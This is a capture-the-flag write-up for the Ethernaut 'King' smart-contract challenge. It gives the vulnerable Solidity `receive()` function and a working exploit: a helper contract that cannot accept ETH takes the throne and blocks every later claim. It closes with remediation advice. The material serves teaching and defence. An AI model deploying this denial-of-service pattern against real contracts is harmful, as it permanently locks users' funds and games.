# King — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 09 — King](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-king) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `src/King.sol` |
| **Solidity** | `^0.8.0` |
| **Severity** | Critical |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

Claiming the throne pushes ETH to the previous `king` with `.transfer` before updating state. If the current king is a contract that cannot receive ETH, every future claim — including the level owner’s reclaim — reverts. Deploy a helper with no `receive`/`fallback`, send `prize` wei to become king, and the game is permanently stuck.

**Impact:** denial of service on kingship / any similar “push payment to previous winner” pattern.

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Player’s contract is king; owner cannot reclaim | `_king()` is helper; owner `call{value:}` fails |

---

## Finding

### [C-01] DoS via untrusted king + `.transfer`

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Denial of service / unexpected revert on external call |
| **Location** | `src/King.sol` `receive()` |
| **CWE** | [CWE-703](https://cwe.mitre.org/data/definitions/703.html) — Improper Check or Handling of Exceptional Conditions |
| **SWC** | [SWC-113](https://swcregistry.io/docs/SWC-113) — DoS with Failed Call |

#### Vulnerable code

```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value); // reverts if king rejects ETH
    king = msg.sender;
    prize = msg.value;
}
```

#### Proof of concept

```bash
cd web3-ctf-challenges/09-ethernaut-king
forge test --match-test testExploit -vv
```

**Result:**

```
[PASS] testExploit() (gas: 223246)
```

---

## Attack scenario

### 7-question gate

| Step | Answer |
|------|--------|
| **1. Setup** | Deploy contract without payable receive/fallback |
| **2. Call** | Helper sends `prize` ETH to King via `call` |
| **3. Result** | Helper is `_king()`; further claims revert |
| **4. Cost** | `prize` + gas |
| **5. ROI** | Permanent throne / broken game |
| **6. Privileged?** | No |
| **7. Viable?** | Yes |

---

## Exploit implementation

### SCH (`Exploit.s.sol`)

```solidity
contract HelperContract {
    constructor(address payable target) payable {
        (bool ok,) = target.call{value: msg.value}("");
        require(ok, "failed to claim throne");
    }
}

function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    uint256 amount = kingInstance.prize();
    new HelperContract{value: amount}(payable(address(kingInstance)));

    vm.stopBroadcast();
}
```

---

## Remediation

Use a **pull** payment pattern for the previous king, or update `king` even if the refund fails. Do not let an untrusted recipient abort the state transition.

---

## Key lessons

1. **Pushing ETH to arbitrary addresses is a DoS footgun.**
2. **`.transfer` is not “safe”** — it reverts on failure and only forwards 2300 gas.
3. **Owner bypasses ≠ owner immune** — owner still hits the failing transfer.

---

## References

- [SCH King challenge](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-king)
- [SWC-113: DoS with Failed Call](https://swcregistry.io/docs/SWC-113)
- Local: `Exploit.s.sol`, `test/KingExploit.t.sol`
